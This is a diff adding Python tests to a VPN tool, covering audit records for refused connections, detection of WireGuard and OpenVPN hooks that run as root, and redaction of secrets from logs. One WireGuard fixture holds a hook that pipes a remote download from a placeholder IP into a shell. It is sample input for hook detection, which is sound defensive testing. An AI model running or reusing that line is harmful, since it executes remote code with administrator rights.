@@ -348,3 +348,148 @@ def test_interface_state_reads_wg_quick_run_records(tmp_path):
     assert vpn_execution.wireguard_interface_state("wg0", tmp_path)["up"] is False  # stale: no socket
     (tmp_path / "utun5.sock").write_text("")
     assert vpn_execution.wireguard_interface_state("wg0", tmp_path) == {"up": True, "device": "utun5"}
+
+
+# ── Refusals before execute() are audited too ────────────────────────────────
+
+def test_record_refusal_matches_the_execute_entry_shape(tmp_path):
+    import json
+    audit = tmp_path / "audit.jsonl"
+    review = vpn_execution.review_execution(
+        "connect", {"name": "VPS", "protocol": "WireGuard", "endpoint": "203.0.113.7",
+                    "interface": "wg0"},
+        probe=Probe(), killswitch_armed=lambda: False)
+    vpn_execution.record_refusal("connect", {"name": "VPS"}, "Operator declined.",
+                                 review=review, outcome="declined", audit_path=audit)
+    entry = json.loads(audit.read_text().splitlines()[-1])
+    assert set(entry) >= {"time", "action", "protocol", "profile", "target", "interface",
+                          "command", "outcome", "blockers", "warnings", "verified",
+                          "verification", "error"}
+    assert entry["outcome"] == "declined" and entry["profile"] == "VPS"
+    assert entry["command"] == review.command and entry["verified"] is None
+    assert oct(audit.stat().st_mode & 0o777) == "0o600"
+
+
+def test_record_refusal_without_a_review_uses_the_profile(tmp_path):
+    import json
+    audit = tmp_path / "audit.jsonl"
+    vpn_execution.record_refusal(
+        "connect", {"name": "Example — Japan", "protocol": "OpenVPN", "endpoint": "<SERVER_IP>"},
+        "Template profile.", audit_path=audit)
+    entry = json.loads(audit.read_text().splitlines()[-1])
+    assert entry["outcome"] == "refused" and entry["protocol"] == "OpenVPN"
+    assert entry["target"] == "<SERVER_IP>" and entry["command"] == ""
+
+
+# ── Hooks that run as root are named and confirmed separately ───────────────
+
+def test_wireguard_hooks_are_listed_and_the_key_is_not(tmp_path):
+    path = tmp_path / "wgx.conf"
+    path.write_text(
+        "[Interface]\n"
+        f"PrivateKey = {PRIVATE_KEY}\n"
+        "Address = 10.8.0.2/32\n"
+        "PostUp = iptables -A FORWARD -i %i -j ACCEPT; curl -s http://203.0.113.9/x | sh\n"
+        "postdown = /usr/local/bin/cleanup.sh\n"
+        "# PreUp = commented out, must be ignored\n"
+        "[Peer]\nPublicKey = c2VydmVyLXB1YmxpYy1rZXk=\n"
+        "Endpoint = 203.0.113.7:51820\nAllowedIPs = 0.0.0.0/0\n")
+    hooks = vpn_execution.config_root_hooks(path, "WireGuard")
+    assert len(hooks) == 2
+    assert hooks[0].startswith("PostUp: iptables")
+    assert hooks[1].startswith("postdown: /usr/local/bin/cleanup.sh")
+    assert PRIVATE_KEY not in " ".join(hooks)
+
+
+def test_openvpn_hooks_are_listed(tmp_path):
+    path = tmp_path / "srv.ovpn"
+    path.write_text(
+        "client\nproto udp\nremote 203.0.113.7 1194\n"
+        "script-security 2\n"
+        "up /etc/openvpn/update-resolv-conf\n"
+        "--down /etc/openvpn/update-resolv-conf\n"
+        "plugin /usr/lib/openvpn/openvpn-plugin-auth-pam.so login\n"
+        "# up something-commented\n"
+        "<ca>\nMIIBogus\n</ca>\n")
+    hooks = vpn_execution.config_root_hooks(path, "OpenVPN")
+    assert [h.split(":")[0] for h in hooks] == ["script-security", "up", "--down", "plugin"]
+
+
+def test_a_plain_config_has_no_hooks(tmp_path):
+    assert vpn_execution.config_root_hooks(write_conf(tmp_path), "WireGuard") == []
+    assert vpn_execution.config_root_hooks(tmp_path / "missing.conf", "WireGuard") == []
+
+
+def test_review_surfaces_hooks_in_sections_confirmation_and_warnings(tmp_path):
+    path = tmp_path / "wgh.conf"
+    path.write_text(
+        "[Interface]\n"
+        f"PrivateKey = {PRIVATE_KEY}\nAddress = 10.8.0.2/32\n"
+        "PostUp = /opt/hook.sh up\n"
+        "[Peer]\nPublicKey = c2VydmVyLXB1YmxpYy1rZXk=\n"
+        "Endpoint = 203.0.113.7:51820\nAllowedIPs = 0.0.0.0/0\n")
+    r = review("connect", profile_for(path))
+    assert r.root_hooks == ("PostUp: /opt/hook.sh up",)
+    assert r.allowed                                        # a warning, not a blocker
+    titles = [title for title, _, _ in r.sections()]
+    assert "Runs commands as administrator" in titles
+    assert "RUNS COMMANDS AS ADMINISTRATOR" in r.confirmation_text()
+    assert "/opt/hook.sh up" in r.confirmation_text()
+    assert any("as administrator" in w for w in r.warnings)
+
+
+def test_openvpn_review_surfaces_hooks(tmp_path, monkeypatch):
+    monkeypatch.setattr(vpn_execution.openvpn_manager, "is_openvpn_available", lambda: True)
+    path = tmp_path / "srv.ovpn"
+    path.write_text("client\nremote 203.0.113.7 1194\nscript-security 2\nup /x/y.sh\n")
+    r = review("connect", profile_for(path))
+    assert r.root_hooks == ("script-security: 2", "up: /x/y.sh")
+
+
+def test_disconnect_review_does_not_rescan_hooks(tmp_path):
+    path = tmp_path / "wgh.conf"
+    path.write_text(
+        "[Interface]\nPrivateKey = x\nAddress = 10.8.0.2/32\nPostUp = /opt/hook.sh\n"
+        "[Peer]\nPublicKey = y\nEndpoint = 203.0.113.7:51820\nAllowedIPs = 0.0.0.0/0\n")
+    r = review("disconnect", profile_for(path), probe=Probe(up={"wgh"}))
+    assert r.root_hooks == ()
+
+
+# ── Key material never reaches the Execution tab or the audit log ───────────
+
+CANARY = "cGFub3B0aWNvbi1zZWNyZXQta2V5LWNhbmFyeS0wMDAxMjM="   # 44-char base64
+
+@pytest.mark.parametrize("text, must_vanish", [
+    (f"Line unrecognized: `PrivateKey = {CANARY}`", CANARY),
+    (f"PresharedKey={CANARY}", CANARY),
+    (f"auth-user-pass hunter2 mypassword", "hunter2"),
+    (f"<key>\n-----BEGIN PRIVATE KEY-----\nMIIBogusKeyBody\n-----END PRIVATE KEY-----\n</key>", "MIIBogusKeyBody"),
+    (f"peer {CANARY} handshake failed", CANARY),
+])
+def test_redact_secrets_scrubs_each_shape(text, must_vanish):
+    out = vpn_execution.redact_secrets(text)
+    assert must_vanish not in out
+    assert "redacted" in out
+
+
+def test_redact_secrets_leaves_ordinary_output_alone():
+    text = "[#] ip link add wg0 type wireguard\n[#] wg setconf wg0 /dev/fd/63\nRTNETLINK answers: File exists"
+    assert vpn_execution.redact_secrets(text) == text
+    assert vpn_execution.redact_secrets("") == ""
+    assert vpn_execution.redact_secrets(None) == ""
+
+
+def test_execute_redacts_tool_output_and_error_everywhere(tmp_path):
+    import json
+    conf = write_conf(tmp_path)
+    audit = tmp_path / "audit.jsonl"
+    leaked = f"wg-quick: Line unrecognized: `PrivateKey = {PRIVATE_KEY}`"
+
+    def run(script, prompt, timeout=30):
+        return False, leaked
+    outcome = vpn_execution.execute("connect", profile_for(conf), run_as_root=run,
+                                    probe=Probe(), killswitch_armed=lambda: False,
+                                    audit_path=audit, sleep=lambda s: None)
+    everything = json.dumps(outcome.as_result()) + audit.read_text()
+    assert PRIVATE_KEY not in everything
+    assert "[redacted]" in everything
